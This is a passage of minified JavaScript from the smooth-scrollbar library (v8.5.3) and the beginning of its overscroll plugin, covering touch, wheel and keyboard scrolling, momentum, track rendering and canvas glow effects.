e=this.velocity,i=this.updateTime,n=this.lastPosition,r=Date.now(),a=B(t),o={x:-(a.x-n.x),y:-(a.y-n.y)},s=r-i||16,l=o.x/s*16,c=o.y/s*16;e.x=.9*l+.1*e.x,e.y=.9*c+.1*e.y,this.delta=o,this.updateTime=r,this.lastPosition=a},Y),q=(Object.defineProperty(X.prototype,"_primitiveValue",{get:function(){return{x:0,y:0}},enumerable:!0,configurable:!0}),X.prototype.isActive=function(){return void 0!==this._activeTouchID},X.prototype.getDelta=function(){var t=this._getActiveTracker();return t?a({},t.delta):this._primitiveValue},X.prototype.getVelocity=function(){var t=this._getActiveTracker();return t?a({},t.velocity):this._primitiveValue},X.prototype.track=function(t){var e=this,i=t.targetTouches;return Array.from(i).forEach((function(t){e._add(t)})),this._touchList},X.prototype.update=function(t){var e=this,i=t.touches,n=t.changedTouches;return Array.from(i).forEach((function(t){e._renew(t)})),this._setActiveID(n),this._touchList},X.prototype.release=function(t){var e=this;delete this._activeTouchID,Array.from(t.changedTouches).forEach((function(t){e._delete(t)}))},X.prototype._add=function(t){var e;this._has(t)||(e=new W(t),this._touchList[t.identifier]=e)},X.prototype._renew=function(t){this._has(t)&&this._touchList[t.identifier].update(t)},X.prototype._delete=function(t){delete this._touchList[t.identifier]},X.prototype._has=function(t){return this._touchList.hasOwnProperty(t.identifier)},X.prototype._setActiveID=function(t){this._activeTouchID=t[t.length-1].identifier},X.prototype._getActiveTracker=function(){return this._touchList[this._activeTouchID]},X);function X(){this._touchList={}}function Y(t){this.updateTime=Date.now(),this.delta={x:0,y:0},this.velocity={x:0,y:0},this.lastPosition={x:0,y:0},this.lastPosition=B(t)}(V=U=U||{}).X="x",V.Y="y";var $=(et.prototype.attachTo=function(t){t.appendChild(this.element)},et.prototype.update=function(t,e,i){this.realSize=Math.min(e/i,1)*e,this.displaySize=Math.max(this.realSize,this._minSize),this.offset=t/i*(e+(this.realSize-this.displaySize)),j(this.element,this._getStyle())},et.prototype._getStyle=function(){switch(this._direction){case U.X:return{width:this.displaySize+"px","-transform":"translate3d("+this.offset+"px, 0, 0)"};case U.Y:return{height:this.displaySize+"px","-transform":"translate3d(0, "+this.offset+"px, 0)"};default:return null}},et),Z=(tt.prototype.attachTo=function(t){t.appendChild(this.element)},tt.prototype.show=function(){this._isShown||(this._isShown=!0,this.element.classList.add("show"))},tt.prototype.hide=function(){this._isShown&&(this._isShown=!1,this.element.classList.remove("show"))},tt.prototype.update=function(t,e,i){j(this.element,{display:i<=e?"none":"block"}),this.thumb.update(t,e,i)},tt),J=(Q.prototype.update=function(){var t=this._scrollbar,e=t.size,i=t.offset;this.xAxis.update(i.x,e.container.width,e.content.width),this.yAxis.update(i.y,e.container.height,e.content.height)},Q.prototype.autoHideOnIdle=function(){this._scrollbar.options.alwaysShowTracks||(this.xAxis.hide(),this.yAxis.hide())},o([R(300)],Q.prototype,"autoHideOnIdle",null),Q),K=new WeakMap;function Q(t){var e=(this._scrollbar=t).options.thumbMinSize;this.xAxis=new Z(U.X,e),this.yAxis=new Z(U.Y,e),this.xAxis.attachTo(t.containerEl),this.yAxis.attachTo(t.containerEl),t.options.alwaysShowTracks&&(this.xAxis.show(),this.yAxis.show())}function tt(t,e){void 0===e&&(e=0),this.element=document.createElement("div"),this._isShown=!1,this.element.className="scrollbar-track scrollbar-track-"+t,this.thumb=new $(t,e),this.thumb.attachTo(this.element)}function et(t,e){void 0===e&&(e=0),this._direction=t,this._minSize=e,this.element=document.createElement("div"),this.displaySize=0,this.realSize=0,this.offset=0,this.element.className="scrollbar-thumb scrollbar-thumb-"+t}function it(t){return Math.pow(t-1,3)+1}var nt,rt,at,ot,st,lt=(ht.prototype.onInit=function(){},ht.prototype.onDestroy=function(){},ht.prototype.onUpdate=function(){},ht.prototype.onRender=function(t){},ht.prototype.transformDelta=function(t,e){return a({},t)},ht.pluginName="",ht.defaultOptions={},ht),ct={order:new Set,constructors:{}};function ht(t,e){var i=this.constructor;this.scrollbar=t,this.name=i.pluginName,this.options=a(a({},i.defaultOptions),e)}function ut(t){var e=k(t),i=t.containerEl;e(i,"keydown",(function(e){var n,r,a,o=document.activeElement;o!==i&&!i.contains(o)||("INPUT"===o.tagName||"SELECT"===o.tagName||"TEXTAREA"===o.tagName||o.isContentEditable)&&!o.disabled||(n=function(t,e){var i,n=t.size,r=t.limit,a=t.offset;switch(e){case nt.TAB:return i=t,void requestAnimationFrame((function(){i.scrollIntoView(document.activeElement,{offsetTop:i.size.container.height/2,onlyScrollIfNeeded:!0})}));case nt.SPACE:return[0,200];case nt.PAGE_UP:return[0,40-n.container.height];case nt.PAGE_DOWN:return[0,n.container.height-40];case nt.END:return[0,r.y-a.y];case nt.HOME:return[0,-a.y];case nt.LEFT:return[-40,0];case nt.UP:return[0,-40];case nt.RIGHT:return[40,0];case nt.DOWN:return[0,40];default:return null}}(t,e.keyCode||e.which))&&(r=n[0],a=n[1],t.addTransformableMomentum(r,a,e,(function(i){i?e.preventDefault():(t.containerEl.blur(),t.parent&&t.parent.containerEl.focus())})))}))}function dt(t){var e,i,n,r,a,o=k(t),s=t.containerEl,l=t.track,c=l.xAxis,h=l.yAxis;function u(e,i){var n=t.size;return e===rt.X?i/(n.container.width+(c.thumb.realSize-c.thumb.displaySize))*n.content.width:e===rt.Y?i/(n.container.height+(h.thumb.realSize-h.thumb.displaySize))*n.content.height:0}function d(t){return F(t,[c.element,c.thumb.element])?rt.X:F(t,[h.element,h.thumb.element])?rt.Y:void 0}o(s,"click",(function(e){var n,r,a,o,s,l,p;!i&&F(e.target,[c.element,h.element])&&(r=d(n=e.target),a=n.getBoundingClientRect(),o=B(e),s=t.offset,l=t.limit,r===rt.X&&(p=o.x-a.left-c.thumb.displaySize/2,t.setMomentum(S(u(r,p)-s.x,-s.x,l.x-s.x),0)),r===rt.Y&&(p=o.y-a.top-h.thumb.displaySize/2,t.setMomentum(0,S(u(r,p)-s.y,-s.y,l.y-s.y))))})),o(s,"mousedown",(function(i){var o,l,u;F(i.target,[c.thumb.element,h.thumb.element])&&(e=!0,o=i.target,l=B(i),u=o.getBoundingClientRect(),r=d(o),n={x:l.x-u.left,y:l.y-u.top},a=s.getBoundingClientRect(),j(t.containerEl,{"-user-select":"none"}))})),o(window,"mousemove",(function(o){var s,l,c;e&&(i=!0,s=t.offset,l=B(o),r===rt.X&&(c=l.x-n.x-a.left,t.setPosition(u(r,c),s.y)),r===rt.Y&&(c=l.y-n.y-a.top,t.setPosition(s.x,u(r,c))))})),o(window,"mouseup blur",(function(){e=i=!1,j(t.containerEl,{"-user-select":""})}))}function pt(t){k(t)(window,"resize",P(t.update.bind(t),300))}function ft(t){var e,i=k(t),n=t.containerEl,r=t.contentEl,a=t.offset,o=t.limit,s=!1;i(window,"mousemove",(function(i){var n,r,l,c,h,u,d,p,f;s&&(cancelAnimationFrame(e),function i(n){var r=n.x,s=n.y;(r||s)&&(t.setMomentum(S(a.x+r,0,o.x)-a.x,S(a.y+s,0,o.y)-a.y),e=requestAnimationFrame((function(){i({x:r,y:s})})))}((r=(n=t.bounding).top,l=n.right,c=n.bottom,h=n.left,d=(u=B(i)).x,p=u.y,f={x:0,y:0},0===d&&0===p||(l-20<d?f.x=d-l+20:d<h+20&&(f.x=d-h-20),c-20<p?f.y=p-c+20:p<r+20&&(f.y=p-r-20),f.x*=2,f.y*=2),f)))})),i(r,"selectstart",(function(t){t.stopPropagation(),cancelAnimationFrame(e),s=!0})),i(window,"mouseup blur",(function(){cancelAnimationFrame(e),s=!1})),i(n,"scroll",(function(t){t.preventDefault(),n.scrollTop=n.scrollLeft=0}))}function mt(t){var e,i=/Android/.test(navigator.userAgent)?3:2,n=t.options.delegateTo||t.containerEl,r=new q,a=k(t),o=0;a(n,"touchstart",(function(i){r.track(i),t.setMomentum(0,0),0===o&&(e=t.options.damping,t.options.damping=Math.max(e,.5)),o++})),a(n,"touchmove",(function(e){var i,n,a;at&&at!==t||(r.update(e),n=(i=r.getDelta()).x,a=i.y,t.addTransformableMomentum(n,a,e,(function(i){i&&e.cancelable&&(e.preventDefault(),at=t)})))})),a(n,"touchcancel touchend",(function(n){var a=r.getVelocity(),s={x:0,y:0};Object.keys(a).forEach((function(t){var n=a[t]/e;s[t]=Math.abs(n)<50?0:n*i})),t.addTransformableMomentum(s.x,s.y,n),0==--o&&(t.options.damping=e),r.release(n),at=null}))}function gt(t){k(t)(t.options.delegateTo||t.containerEl,"onwheel"in window||document.implementation.hasFeature("Events.wheel","3.0")?"wheel":"mousewheel",(function(e){var i=function(t){if("deltaX"in t){var e=xt(t.deltaMode);return{x:t.deltaX/vt.STANDARD*e,y:t.deltaY/vt.STANDARD*e}}return"wheelDeltaX"in t?{x:t.wheelDeltaX/vt.OTHERS,y:t.wheelDeltaY/vt.OTHERS}:{x:0,y:t.wheelDelta/vt.OTHERS}}(e),n=i.x,r=i.y;t.addTransformableMomentum(n,r,e,(function(t){t&&e.preventDefault()}))}))}(st=nt=nt||{})[st.TAB=9]="TAB",st[st.SPACE=32]="SPACE",st[st.PAGE_UP=33]="PAGE_UP",st[st.PAGE_DOWN=34]="PAGE_DOWN",st[st.END=35]="END",st[st.HOME=36]="HOME",st[st.LEFT=37]="LEFT",st[st.UP=38]="UP",st[st.RIGHT=39]="RIGHT",st[st.DOWN=40]="DOWN",(ot=rt=rt||{})[ot.X=0]="X",ot[ot.Y=1]="Y";var vt={STANDARD:1,OTHERS:-3},yt=[1,28,500],xt=function(t){return yt[t]||yt[0]},bt=new Map,wt=(Object.defineProperty(St.prototype,"parent",{get:function(){for(var t=this.containerEl.parentElement;t;){var e=bt.get(t);if(e)return e;t=t.parentElement}return null},enumerable:!0,configurable:!0}),Object.defineProperty(St.prototype,"scrollTop",{get:function(){return this.offset.y},set:function(t){this.setPosition(this.scrollLeft,t)},enumerable:!0,configurable:!0}),Object.defineProperty(St.prototype,"scrollLeft",{get:function(){return this.offset.x},set:function(t){this.setPosition(t,this.scrollTop)},enumerable:!0,configurable:!0}),St.prototype.getSize=function(){return t=this.containerEl,e=this.contentEl,{container:{width:t.clientWidth,height:t.clientHeight},content:{width:e.offsetWidth-e.clientWidth+e.scrollWidth,height:e.offsetHeight-e.clientHeight+e.scrollHeight}};var t,e},St.prototype.update=function(){var t,e,i,n,r;e=(t=this).getSize(),i={x:Math.max(e.content.width-e.container.width,0),y:Math.max(e.content.height-e.container.height,0)},n=t.containerEl.getBoundingClientRect(),r={top:Math.max(n.top,0),right:Math.min(n.right,window.innerWidth),bottom:Math.min(n.bottom,window.innerHeight),left:Math.max(n.left,0)},t.size=e,t.limit=i,t.bounding=r,t.track.update(),t.setPosition(),this._plugins.forEach((function(t){t.onUpdate()}))},St.prototype.isVisible=function(t){return e=this.bounding,i=t.getBoundingClientRect(),n=Math.max(e.top,i.top),r=Math.max(e.left,i.left),a=Math.min(e.right,i.right),n<Math.min(e.bottom,i.bottom)&&r<a;var e,i,n,r,a},St.prototype.setPosition=function(t,e,i){var n=this;void 0===t&&(t=this.offset.x),void 0===e&&(e=this.offset.y),void 0===i&&(i={});var r,o,s,l,c,h,u,d,p=(o=t,s=e,l=(r=this).options,c=r.offset,h=r.limit,u=r.track,d=r.contentEl,l.renderByPixels&&(o=Math.round(o),s=Math.round(s)),o=S(o,0,h.x),s=S(s,0,h.y),o!==c.x&&u.xAxis.show(),s!==c.y&&u.yAxis.show(),l.alwaysShowTracks||u.autoHideOnIdle(),o===c.x&&s===c.y?null:(j(d,{"-transform":"translate3d("+-(c.x=o)+"px, "+-(c.y=s)+"px, 0)"}),u.update(),{offset:a({},c),limit:a({},h)}));p&&!i.withoutCallbacks&&this._listeners.forEach((function(t){t.call(n,p)}))},St.prototype.scrollTo=function(t,e,i,n){void 0===t&&(t=this.offset.x),void 0===e&&(e=this.offset.y),void 0===i&&(i=0),void 0===n&&(n={}),function(t,e,i,r){void 0===r&&(r=0);var a=void 0===n?{}:n,o=a.easing,s=void 0===o?it:o,l=a.callback,c=t.options,h=t.offset,u=t.limit;c.renderByPixels&&(e=Math.round(e),i=Math.round(i));var d=h.x,p=h.y,f=S(e,0,u.x)-d,m=S(i,0,u.y)-p,g=Date.now();cancelAnimationFrame(K.get(t)),function e(){var i,n=Date.now()-g,a=r?s(Math.min(n/r,1)):1;t.setPosition(d+f*a,p+m*a),r<=n?"function"==typeof l&&l.call(t):(i=requestAnimationFrame(e),K.set(t,i))}()}(this,t,e,i)},St.prototype.scrollIntoView=function(t,e){var i,n,r,a,o,s,l,c,h,u,d,p,f,m,g,v,y,x,b;void 0===e&&(e={}),i=this,n=t,l=void 0===(s=(o=void 0===e?{}:e).alignToTop)||s,h=void 0!==(c=o.onlyScrollIfNeeded)&&c,d=void 0===(u=o.offsetTop)?0:u,f=void 0===(p=o.offsetLeft)?0:p,g=void 0===(m=o.offsetBottom)?0:m,v=i.containerEl,y=i.bounding,x=i.offset,b=i.limit,n&&v.contains(n)&&(r=n.getBoundingClientRect(),h&&i.isVisible(n)||(a=l?r.top-y.top-d:r.bottom-y.bottom+g,i.setMomentum(r.left-y.left-f,S(a,-x.y,b.y-x.y))))},St.prototype.addListener=function(t){if("function"!=typeof t)throw new TypeError("[smooth-scrollbar] scrolling listener should be a function");this._listeners.add(t)},St.prototype.removeListener=function(t){this._listeners.delete(t)},St.prototype.addTransformableMomentum=function(t,e,i,n){this._updateDebounced();var r=this._plugins.reduce((function(t,e){return e.transformDelta(t,i)||t}),{x:t,y:e}),a=!this._shouldPropagateMomentum(r.x,r.y);a&&this.addMomentum(r.x,r.y),n&&n.call(this,a)},St.prototype.addMomentum=function(t,e){this.setMomentum(this._momentum.x+t,this._momentum.y+e)},St.prototype.setMomentum=function(t,e){0===this.limit.x&&(t=0),0===this.limit.y&&(e=0),this.options.renderByPixels&&(t=Math.round(t),e=Math.round(e)),this._momentum.x=t,this._momentum.y=e},St.prototype.updatePluginOptions=function(t,e){this._plugins.forEach((function(i){i.name===t&&Object.assign(i.options,e)}))},St.prototype.destroy=function(){var t,e=this.containerEl,i=this.contentEl;(t=z.get(this))&&(t.forEach((function(t){var e=t.elem,i=t.eventName,n=t.handler;e.removeEventListener(i,n,N())})),z.delete(this)),this._listeners.clear(),this.setMomentum(0,0),cancelAnimationFrame(this._renderID),this._observer&&this._observer.disconnect(),bt.delete(this.containerEl);for(var n=Array.from(i.childNodes);e.firstChild;)e.removeChild(e.firstChild);n.forEach((function(t){e.appendChild(t)})),j(e,{overflow:""}),e.scrollTop=this.scrollTop,e.scrollLeft=this.scrollLeft,this._plugins.forEach((function(t){t.onDestroy()})),this._plugins.length=0},St.prototype._init=function(){var t=this;this.update(),Object.keys(n).forEach((function(e){n[e](t)})),this._plugins.forEach((function(t){t.onInit()})),this._render()},St.prototype._updateDebounced=function(){this.update()},St.prototype._shouldPropagateMomentum=function(t,e){void 0===t&&(t=0),void 0===e&&(e=0);var i=this.options,n=this.offset,r=this.limit;if(!i.continuousScrolling)return!1;0===r.x&&0===r.y&&this._updateDebounced();var a=S(t+n.x,0,r.x),o=S(e+n.y,0,r.y);return a===n.x&&o===n.y&&(n.x===r.x||0===n.x||n.y===r.y||0===n.y)},St.prototype._render=function(){var t,e,i=this._momentum;(i.x||i.y)&&(t=this._nextTick("x"),e=this._nextTick("y"),i.x=t.momentum,i.y=e.momentum,this.setPosition(t.position,e.position));var n=a({},this._momentum);this._plugins.forEach((function(t){t.onRender(n)})),this._renderID=requestAnimationFrame(this._render.bind(this))},St.prototype._nextTick=function(t){var e=this.options,i=this.offset,n=this._momentum,r=i[t],a=n[t];if(Math.abs(a)<=.1)return{momentum:0,position:r+a};var o=a*(1-e.damping);return e.renderByPixels&&(o|=0),{momentum:o,position:r+a-o}},o([R(100,{leading:!0})],St.prototype,"_updateDebounced",null),St),_t="smooth-scrollbar-style",Mt=!1;function St(t,e){var i=this;this.offset={x:0,y:0},this.limit={x:1/0,y:1/0},this.bounding={top:0,right:0,bottom:0,left:0},this._plugins=[],this._momentum={x:0,y:0},this._listeners=new Set,this.containerEl=t;var n,r,a=this.contentEl=document.createElement("div");this.options=new I(e),t.setAttribute("data-scrollbar","true"),t.setAttribute("tabindex","-1"),j(t,{overflow:"hidden",outline:"none"}),window.navigator.msPointerEnabled&&(t.style.msTouchAction="none"),a.className="scroll-content",Array.from(t.childNodes).forEach((function(t){a.appendChild(t)})),t.appendChild(a),this.track=new J(this),this.size=this.getSize(),this._plugins=(r=(n=this).options.plugins,Array.from(ct.order).filter((function(t){return!1!==r[t]})).map((function(t){var e=new ct.constructors[t](n,r[t]);return r[t]=e.options,e})));var o=t.scrollLeft,s=t.scrollTop;t.scrollLeft=t.scrollTop=0,this.setPosition(o,s,{withoutCallbacks:!0});var l=window,c=l.MutationObserver||l.WebKitMutationObserver||l.MozMutationObserver;"function"==typeof c&&(this._observer=new c((function(){i.update()})),this._observer.observe(a,{subtree:!0,childList:!0})),bt.set(t,this),requestAnimationFrame((function(){i._init()}))}function Tt(){var t;Mt||"undefined"==typeof window||((t=document.createElement("style")).id=_t,t.textContent="\n[data-scrollbar] {\n  display: block;\n  position: relative;\n}\n\n.scroll-content {\n  -webkit-transform: translate3d(0, 0, 0);\n          transform: translate3d(0, 0, 0);\n}\n\n.scrollbar-track {\n  position: absolute;\n  opacity: 0;\n  z-index: 1;\n  background: rgba(222, 222, 222, .75);\n  -webkit-user-select: none;\n     -moz-user-select: none;\n      -ms-user-select: none;\n          user-select: none;\n  -webkit-transition: opacity 0.5s 0.5s ease-out;\n          transition: opacity 0.5s 0.5s ease-out;\n}\n.scrollbar-track.show,\n.scrollbar-track:hover {\n  opacity: 1;\n  -webkit-transition-delay: 0s;\n          transition-delay: 0s;\n}\n\n.scrollbar-track-x {\n  bottom: 0;\n  left: 0;\n  width: 100%;\n  height: 8px;\n}\n.scrollbar-track-y {\n  top: 0;\n  right: 0;\n  width: 8px;\n  height: 100%;\n}\n.scrollbar-thumb {\n  position: absolute;\n  top: 0;\n  left: 0;\n  width: 8px;\n  height: 8px;\n  background: rgba(0, 0, 0, .5);\n  border-radius: 4px;\n}\n",document.head&&document.head.appendChild(t),Mt=!0)}i.d(e,"ScrollbarPlugin",(function(){return lt}));var Et,Ct,At,Lt=(r(Ct=Pt,At=Et=wt),Ct.prototype=null===At?Object.create(At):(Rt.prototype=At.prototype,new Rt),Pt.init=function(t,e){if(!t||1!==t.nodeType)throw new TypeError("expect element to be DOM Element, but got "+t);return Tt(),bt.has(t)?bt.get(t):new wt(t,e)},Pt.initAll=function(t){return Array.from(document.querySelectorAll("[data-scrollbar]"),(function(e){return Pt.init(e,t)}))},Pt.has=function(t){return bt.has(t)},Pt.get=function(t){return bt.get(t)},Pt.getAll=function(){return Array.from(bt.values())},Pt.destroy=function(t){var e=bt.get(t);e&&e.destroy()},Pt.destroyAll=function(){bt.forEach((function(t){t.destroy()}))},Pt.use=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t.forEach((function(t){var e=t.pluginName;if(!e)throw new TypeError("plugin name is required");ct.order.add(e),ct.constructors[e]=t}))}.apply(void 0,t)},Pt.attachStyle=Tt,Pt.detachStyle=function(){var t;!Mt||"undefined"==typeof window||(t=document.getElementById(_t))&&t.parentNode&&(t.parentNode.removeChild(t),Mt=!1)},Pt.version="8.5.3",Pt.ScrollbarPlugin=lt,Pt);function Pt(){return null!==Et&&Et.apply(this,arguments)||this}function Rt(){this.constructor=Ct}e.default=Lt}],t.c=i,t.d=function(e,i,n){t.o(e,i)||Object.defineProperty(e,i,{enumerable:!0,get:n})},t.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},t.t=function(e,i){if(1&i&&(e=t(e)),8&i)return e;if(4&i&&"object"==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(t.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&i&&"string"!=typeof e)for(var r in e)t.d(n,r,function(t){return e[t]}.bind(null,r));return n},t.n=function(e){var i=e&&e.__esModule?function(){return e.default}:function(){return e};return t.d(i,"a",i),i},t.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},t.p="",t(t.s=58).default;function t(n){if(i[n])return i[n].exports;var r=i[n]={i:n,l:!1,exports:{}};return e[n].call(r.exports,r,r.exports,t),r.l=!0,r.exports}var e,i})),function(t,e){"object"==typeof exports&&"object"==typeof module?module.exports=e(require("smooth-scrollbar")):"function"==typeof define&&define.amd?define(["smooth-scrollbar"],e):"object"==typeof exports?exports.OverscrollPlugin=e(require("smooth-scrollbar")):t.OverscrollPlugin=e(t.Scrollbar)}(this,(function(t){return n={},e.m=i=[function(e,i){e.exports=t},function(t,e,i){"use strict";(function(t){var i="object"==typeof t&&t&&t.Object===Object&&t;e.a=i}).call(this,i(3))},function(t,e,i){t.exports=i(4)},function(t,e){var i=function(){return this}();try{i=i||new Function("return this")()}catch(t){"object"==typeof window&&(i=window)}t.exports=i},function(t,e,i){"use strict";function n(t){var e=typeof t;return null!=t&&("object"==e||"function"==e)}function r(t){if("number"==typeof t)return t;if("symbol"==typeof(e=t)||null!=e&&"object"==typeof e&&"[object Symbol]"==(null==(i=e)?void 0===i?"[object Undefined]":"[object Null]":x&&x in Object(i)?function(t){var e=m.call(t,v),i=t[v];try{var n=!(t[v]=void 0)}catch(t){}var r=g.call(t);return n&&(e?t[v]=i:delete t[v]),r}(i):y.call(i)))return NaN;var e,i,r;if(n(t)&&(r="function"==typeof t.valueOf?t.valueOf():t,t=n(r)?r+"":r),"string"!=typeof t)return 0===t?t:+t;t=t.replace(b,"");var a=_.test(t);return a||M.test(t)?S(t.slice(2),a?2:8):w.test(t)?NaN:+t}function a(t,e,i){return void 0===i&&(i=e,e=void 0),void 0!==i&&(i=(i=r(i))==i?i:0),void 0!==e&&(e=(e=r(e))==e?e:0),(n=r(t))==n&&(void 0!==i&&(n=n<=i?n:i),void 0!==e&&(n=e<=n?n:e)),n;var n}function o(){return d.Date.now()}function s(t,e,i){var a,s,l,c,h,u,d=0,p=!1,f=!1,m=!0;if("function"!=typeof t)throw new TypeError("Expected a function");function g(e){var i=a,n=s;return a=s=void 0,d=e,c=t.apply(n,i)}function v(t){var i=t-u;return void 0===u||e<=i||i<0||f&&l<=t-d}function y(){var t,i=o();if(v(i))return x(i);h=setTimeout(y,(t=e-(i-u),f?E(t,l-(i-d)):t))}function x(t){return h=void 0,m&&a?g(t):(a=s=void 0,c)}function b(){var t,i=o(),n=v(i);if(a=arguments,s=this,u=i,n){if(void 0===h)return d=t=u,h=setTimeout(y,e),p?g(t):c;if(f)return clearTimeout(h),h=setTimeout(y,e),g(u)}return void 0===h&&(h=setTimeout(y,e)),c}return e=r(e)||0,n(i)&&(p=!!i.leading,l=(f="maxWait"in i)?T(r(i.maxWait)||0,e):l,m="trailing"in i?!!i.trailing:m),b.cancel=function(){void 0!==h&&clearTimeout(h),a=u=s=h=void(d=0)},b.flush=function(){return void 0===h?c:x(o())},b}i.r(e);var l=function(t,e){return(l=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(t,e)},c=function(){return(c=Object.assign||function(t){for(var e,i=1,n=arguments.length;i<n;i++)for(var r in e=arguments[i])Object.prototype.hasOwnProperty.call(e,r)&&(t[r]=e[r]);return t}).apply(this,arguments)},h=i(1),u="object"==typeof self&&self&&self.Object===Object&&self,d=h.a||u||Function("return this")(),p=d.Symbol,f=Object.prototype,m=f.hasOwnProperty,g=f.toString,v=p?p.toStringTag:void 0,y=Object.prototype.toString,x=p?p.toStringTag:void 0,b=/^\s+|\s+$/g,w=/^[-+]0x[0-9a-f]+$/i,_=/^0b[01]+$/i,M=/^0o[0-7]+$/i,S=parseInt,T=Math.max,E=Math.min,C=i(0),A=["webkit","moz","ms","o"],L=new RegExp("^-(?!(?:"+A.join("|")+")-)");function P(t,e){var i,n;i=e,n={},Object.keys(i).forEach((function(t){var e;L.test(t)?(e=i[t],t=t.replace(/^-/,""),n[t]=e,A.forEach((function(i){n["-"+i+"-"+t]=e}))):n[t]=i[t]})),e=n,Object.keys(e).forEach((function(i){var n=i.replace(/^-/,"").replace(/-([a-z])/g,(function(t,e){return e.toUpperCase()}));t.style[n]=e[i]}))}var R,O,I=(N.prototype.render=function(t){var e,i=t.x,n=void 0===i?0:i,r=t.y,a=void 0===r?0:r,o=this._scrollbar,s=o.size,l=o.track,c=o.offset;P(o.contentEl,{"-transform":"translate3d("+-(c.x+n)+"px, "+-(c.y+a)+"px, 0)"}),n&&(l.xAxis.show(),e=s.container.width/(s.container.width+Math.abs(n)),P(l.xAxis.thumb.element,{"-transform":"translate3d("+l.xAxis.thumb.offset+"px, 0, 0) scale3d("+e+", 1, 1)","-transform-origin":n<0?"left":"right"})),a&&(l.yAxis.show(),e=s.container.height/(s.container.height+Math.abs(a)),P(l.yAxis.thumb.element,{"-transform":"translate3d(0, "+l.yAxis.thumb.offset+"px, 0) scale3d(1, "+e+", 1)","-transform-origin":a<0?"top":"bottom"})),l.autoHideOnIdle()},N),z=(D.prototype.mount=function(){this._scrollbar.containerEl.appendChild(this._canvas)},D.prototype.unmount=function(){this._canvas.parentNode&&this._canvas.parentNode.removeChild(this._canvas)},D.prototype.adjust=function(){var t=this._scrollbar.size,e=window.devicePixelRatio||1,i=t.container.width*e,n=t.container.height*e;i===this._canvas.width&&n===this._canvas.height||(this._canvas.width=i,this._canvas.height=n,this._ctx.scale(e,e))},D.prototype.recordTouch=function(t){var e=t.touches[t.touches.length-1];this._touchX=e.clientX,this._touchY=e.clientY},D.prototype.render=function(t,e){var i,n=t.x,r=void 0===n?0:n,a=t.y,o=void 0===a?0:a;r||o?(P(this._canvas,{display:"block"}),i=this._scrollbar.size,this._ctx.clearRect(0,0,i.container.width,i.container.height),this._ctx.fillStyle=e,this._renderX(r),this._renderY(o)):P(this._canvas,{display:"none"})},D.prototype._getMaxOverscroll=function(){var t=this._scrollbar.options.plugins.overscroll;return t&&t.maxOverscroll?t.maxOverscroll:150},D.prototype._renderX=function(t){var e=this._scrollbar.size,i=this._getMaxOverscroll(),n=e.container,r=n.width,o=n.height,s=this._ctx;s.save(),0<t&&s.transform(-1,0,0,1,r,0);var l=a(Math.abs(t)/i,0,.75),c=a(l,0,.25)*r,h=Math.abs(t),u=this._touchY||o/2;s.globalAlpha=l,s.beginPath(),s.moveTo(0,-c),s.quadraticCurveTo(h,u,0,o+c),s.fill(),s.closePath(),s.restore()},D.prototype._renderY=function(t){var e=this._scrollbar.size,i=this._getMaxOverscroll(),n=e.container,r=n.width,o=n.height,s=this._ctx;s.save(),0<t&&s.transform(1,0,0,-1,0,o);var l=a(Math.abs(t)/i,0,.75),c=a(l,0,.25)*r,h=this._touchX||r/2,u=Math.abs(t);s.globalAlpha=l,s.beginPath(),s.moveTo(-c,0),s.quadraticCurveTo(h,u,r+c,0),s.fill(),s.closePath(),s.restore()},D);function D(t){this._scrollbar=t,this._canvas=document.createElement("canvas"),this._ctx=this._canvas.getContext("2d"),P(this._canvas,{position:"absolute",top:0,left:0,width:"100%",height:"100%",display:"none"})}function N(t){this._scrollbar=t}i.d(e,"OverscrollEffect",(function(){return R})),(O=R=R||{}).BOUNCE="bounce",O.GLOW="glow";var k,B,F,H=/wheel|touch/,G=(k=C.ScrollbarPlugin,l(B=j,F=k),B.prototype=null===F?Object.create(F):(U.prototype=F.prototype,new U),Object.defineProperty(j.prototype,"_isWheelLocked",{get:function(){return this._lockWheel.x||this._lockWheel.y},enumerable:!0,configurable:!0}),Object.defineProperty(j.prototype,"_enabled",{get:function(){return!!this.options.effect},enumerable:!0,configurable:!0}),j.prototype.onInit=function(){var t=this._glow,e=this.options,i=this.scrollbar,n=e.effect;Object.defineProperty(e,"effect",{get:function(){return n},set:function(e){if(e){if(e!==R.BOUNCE&&e!==R.GLOW)throw new TypeError("unknow overscroll effect: "+e);n=e,i.options.continuousScrolling=!1,e===R.GLOW?(t.mount(),t.adjust()):t.unmount()}else n=void 0}}),e.effect=n},j.prototype.onUpdate=function(){this.options.effect===R.GLOW&&this._glow.adjust()},j.prototype.onRender=function(t){var e,i;this._enabled&&(this.scrollbar.options.continuousScrolling&&(this.scrollbar.options.continuousScrolling=!1),e=t.x,i=t.y,!this._amplitude.x&&this._willOverscroll("x",t.x)&&(e=0,this._absorbMomentum("x",t.x)),!this._amplitude.y&&this._willOverscroll("y",t.y)&&(i=0,this._absorbMomentum("y",t.y)),this.scrollbar.setMomentum(e,i),this._render())},j.prototype.transformDelta=function(t,e){if(this._lastEventType=e.type,!this._enabled||!H.test(e.type))return t;this._isWheelLocked&&/wheel/.test(e.type)&&(this._releaseWheel(),this._willOverscroll("x",t.x)&&(t.x=0),this._willOverscroll("y",t.y)&&(t.y=0));var i=t.x,n=t.y;switch(this._willOverscroll("x",t.x)&&(i=0,this._addAmplitude("x",t.x)),this._willOverscroll("y",t.y)&&(n=0,this._addAmplitude("y",t.y)),e.type){case"touchstart":case"touchmove":this._touching=!0,this._glow.recordTouch(e);break;case"touchcancel":case"touchend":this._touching=!1}return{x:i,y:n}},j.prototype._willOverscroll=function(t,e){if(!e)return!1;if(this._position[t])return!0;var i=this.scrollbar.offset[t],n=this.scrollbar.limit[t];return 0!==n&&a(i+e,0,n)===i&&(0===i||i===n)},j.prototype._absorbMomentum=function(t,e){var i=this.options,n=this._lastEventType,r=this._amplitude;H.test(n)&&(r[t]=a(e,-i.maxOverscroll,i.maxOverscroll))},j.prototype._addAmplitude=function(t,e){var 